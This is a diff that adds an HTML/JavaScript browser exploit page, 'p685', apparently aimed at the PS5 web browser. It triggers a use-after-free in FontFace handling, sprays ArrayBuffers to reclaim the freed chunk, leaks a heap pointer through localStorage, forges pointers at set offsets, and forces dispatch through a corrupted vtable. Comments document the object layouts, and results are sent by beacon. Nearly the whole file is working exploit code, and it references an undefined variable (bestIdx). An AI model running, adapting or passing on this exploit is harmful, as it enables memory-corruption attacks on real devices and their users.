@@ -1,0 +1,230 @@
+<!--
+  p685: FontFace chain — weak-set walk + dispatch census on the deref run
+
+  Goal (per cobra 08:18Z ruling + our plan from #181/#212/#213):
+  1. Prime: standard leak load stores this process's stable T (+0x58) to
+     localStorage so arms can forge a REAL heap VA into the face chunk.
+  2. Arms (ONE PER LOAD, hash #N — census rule: dose per load, not per page,
+     poison-page results only count from single-arm loads; doc
+     FONTFACE_MEMBER_MAP_14_10.md):
+       #1  forge  +0x28 = T   (container pointer run start)
+       #2  forge  +0x30 = T
+       #3  forge  +0x38 = T   (secondary vptr slot itself)
+       #4  forge  +0x40 = T
+       #5  forge  +0x48 = T
+       #6  forge  +0x68 = T   (wrapper slot — real heap VA instead of the
+                              fatal 1 from uaf63 arm B)
+       #7  forge  +0x50 = T   (survivor medlem forged real)
+       #8  CONTROL: arm #1 forge but NO free (style stays attached) —
+                   verifies crash causality in arm pages (uaf58 control)
+       #9  forge  +0x68 = priorImpl (impl drifts ~0x10 in-process; the real
+                   wrapper impl at the wrapper slot — discriminator read)
+  3. Dispatch proof: with the live FontFace wrapper as the client, the
+     check() continuation walks m_clients (table T) and dispatches through
+     the secondary vtable at FontFace+0x38 (FontFace.cpp:162/:170/:328).
+     Engine code touching the freed face = fault -> system error history
+     records module+offset = TEXT anchor, no reader needed.
+
+  Field layout (FontFace, cobra drop-enumeration):
+    +0x00 m_refCount u32 | +0x08 primary vptr (.data.rel.ro val = base+RVA)
+    +0x10 ScriptExecutionContext* (Document*) | +0x18 m_pendingActivity∈{0,1}
+    +0x20 m_backing Ref<CSSFontFace> | +0x28 m_loadedPromise (UniqueRef)
+    +0x30 bool | +0x38 CSSFontFace::Client subobject — secondary vptr
+  CSSFontFace (192B face chunk, ours after landing):
+    +0x58 m_clients { m_table ... } | +0x68 m_wrapper Ref<DefaultWeakPtrImpl>
+
+  IMPORTANT: prime T from a LEAK load (#0 / bare URL) in the SAME browser
+  process first. After a crash restart, re-prime before any arm.
+
+  CRASH_CLASS: HIGH (one death per arm load is the expected evidence)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p685</title></head>
+<body>p685: fontface walk + dispatch census
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P685-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+function hex8(v){return('0'+v.toString(16)).slice(-2);}
+function qw(v,off){var s='';for(var i=7;i>=0;i--)s+=hex8(v[off+i]);return s;}
+
+var arm=parseInt(location.hash.slice(1));if(isNaN(arm))arm=0;
+// AUTO-CYCLE: the PS5 user can only reach root, so the arm sequence is
+// carried in localStorage. Fresh load -> next arm. A crash restart reloads
+// root and advances automatically; a surviving load advances on manual reload.
+var autoNext=0;
+(function(){
+  try{
+    if(location.hash.slice(1)==='') {
+      arm=parseInt(localStorage.getItem('p685arm'));
+      if(isNaN(arm))arm=-1; // will resolve below after prime decision
+      autoNext=1;
+    }
+  }catch(e){}
+})();
+emit('START','v1 arm='+arm+' auto='+autoNext);flush();
+var alive=[];
+
+// stored values from a prime (leak) load in the SAME browser process
+var priorT='',priorI='';
+try{priorT=localStorage.getItem('p685T')||'';priorI=localStorage.getItem('p685I')||'';}catch(e){}
+if(priorT) emit('PRIOR-T',priorT);else emit('PRIOR-T','none');
+if(priorI) emit('PRIOR-I',priorI);else emit('PRIOR-I','none');
+flush();
+
+// Forge plan per arm
+var ARMS={
+  0:null, // prime/leak
+  1:{off:0x28,src:'T'},
+  2:{off:0x30,src:'T'},
+  3:{off:0x38,src:'T'},
+  4:{off:0x40,src:'T'},
+  5:{off:0x48,src:'T'},
+  6:{off:0x68,src:'T'},
+  7:{off:0x50,src:'T'},
+  8:{off:0x28,src:'T',nofree:true},
+  9:{off:0x68,src:'I'}
+};
+var A=ARMS[arm]||null;
+if(autoNext){
+  // sequencing: no stored arm state -> prime first, then start at arm 1
+  if(arm<0){
+    if(!priorT){ emit('SEQ','prime -> store T, arms start next load');A=null;arm=0; }
+    else { arm=1;A=ARMS[1]; }
+  }
+  if(A&&A.src==='T'&&!priorT){ emit('SEQ','no T for arms — prime this load, retry arm next reload');A=null;arm=0; }
+}
+if(arm>9)A=ARMS[1];
+if(A) emit('ARM',(function(){return 'off=0x'+A.off.toString(16)+' src='+A.src+' nofree='+(!!A.nofree);})());
+// advance the cycle BEFORE the walk: one arm per load, strict. A killing
+// arm dies and the restart loop advances to the next arm automatically.
+if(autoNext&&arm>0){
+  var skip=arm>=9?1:arm+1;
+  try{localStorage.setItem('p685arm',String(skip));}catch(e){}
+  emit('SEQ','next load = arm '+skip);
+}
+
+// Forge helper: write 8 bytes into every sprayed buffer at off
+function forgeAll(map,off,val){
+  for(var k=0;k<map.length;k++){
+    var v=map[k].view;
+    for(var b=0;b<8;b++) v[off+b]=(val>>(8*(7-b)))&0xFF;
+  }
+}
+function hexToBytes(h){var out=[];for(var i=0;i<8;i++)out.push(parseInt(h.substr(i*2,2),16));return out;}
+
+// ================================================================
+// FontFace UAF trigger (single-arm, p680 recipe)
+// free -> spray 16x AB(192) -> [forge all] -> check() -> continuation
+// ================================================================
+var style,ff,fired=false,map=window.__p685map=[];
+style=document.createElement('style');
+style.textContent="@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(style);
+ff=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);
+void ff.loaded;
+alive.push(ff);
+
+function doFree(){
+  style.remove();
+  try{document.fonts.delete(ff);}catch(e){}
+  document.body.offsetHeight;
+}
+function doSpray(){
+  map=window.__p685map=[];
+  for(var k=0;k<16;k++){
+    var ab=new ArrayBuffer(192);
+    map.push({ab:ab,view:new Uint8Array(ab)});
+  }
+  return map;
+}
+
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(fired)return undefined;
+    fired=true;
+    if(!A || !A.nofree)doFree();
+    doSpray();
+    var forged='';
+    if(A){
+      forged=A.src;
+    }
+    // write the actual bytes (hex string -> 8 bytes BE)
+    if(A){
+      var hx=(A.src==='T')?priorT:priorI;
+      var bs=hexToBytes(hx);
+      for(var k=0;k<map.length;k++){
+        var v=map[k].view;
+        for(var b=0;b<8;b++)v[A.off+b]=bs[b];
+      }
+    }
+    // walk trigger — NO beacon between check() and getter return:
+    // a sync XHR here re-enters the promise machinery mid-continuation
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+emit('TRIGGER','document.fonts.load');
+document.fonts.load('1em f0, s0','AB').then(function(){
+  emit('RESOLVED','promise ok');
+},function(){emit('REJECTED','promise rejected');});
+
+// ================================================================
+// Scan 150ms later
+// ================================================================
+setTimeout(function(){
+  var hit=-1,nzBest=0;
+  for(var i=0;i<map.length;i++){
+    var v=map[i].view,n=0;
+    for(var j=0;j<192;j++)if(v[j]!==0)n++;
+    if(n>nzBest){nzBest=n;hit=i;}
+  }
+  if(hit<0){
+    emit('SCAN','clean-no-reclaim');
+  } else {
+    var v=map[hit].view;
+    emit('SCAN','buf='+hit+' nz='+nzBest);
+    emit('PAIR','58='+qw(v,0x58)+' 68='+qw(v,0x68));
+    // forged slot echo: did the engine overwrite our forge?
+    if(A){
+      var before='';
+      for(var b=0;b<8;b++)before+=hex8((function(){var hx=(A.src==='T')?priorT:priorI;var bs=hexToBytes(hx);return bs[b];})());
+      emit('SLOT','0x'+A.off.toString(16)+' now='+qw(v,A.off)+' forged='+before+' same='+(qw(v,A.off)===before));
+      // also dump the 0x18-0x70 run to see survivor/overwritten cells
+      var cells='';
+      for(var o=0x18;o<=0x68;o+=8)cells+=o.toString(16)+':'+qw(v,o)+' ';
+      emit('RUN',cells.trim());
+    }
+    // store T/impl for arms when this is a prime load
+    if(!A){
+      var t58=qw(v,0x58),i68=qw(v,0x68);
+      try{localStorage.setItem('p685T',t58);localStorage.setItem('p685I',i68);}catch(e){}
+      emit('STORED','T='+t58+' I='+i68);
+    }
+  }
+  // liveness: force layout; if we beacon, the process survived the walk
+  document.body.offsetHeight;
+  emit('ALIVE','survived');
+  flush();
+  // advance the auto-cycle only for the prime load here (arm loads advanced
+  // before the walk already); prime repeats until T is actually stored
+  if(autoNext&&arm<=0){
+    var nxt=(bestIdx>=0)?1:0;
+    try{localStorage.setItem('p685arm',String(nxt));}catch(e){}
+    emit('SEQ','next load = '+(nxt?'arm 1':'prime again'));
+  }
+  emit('DONE','arm='+arm);
+  flush();
+},150);
+
+})();
+</script>
+</body>
+</html>
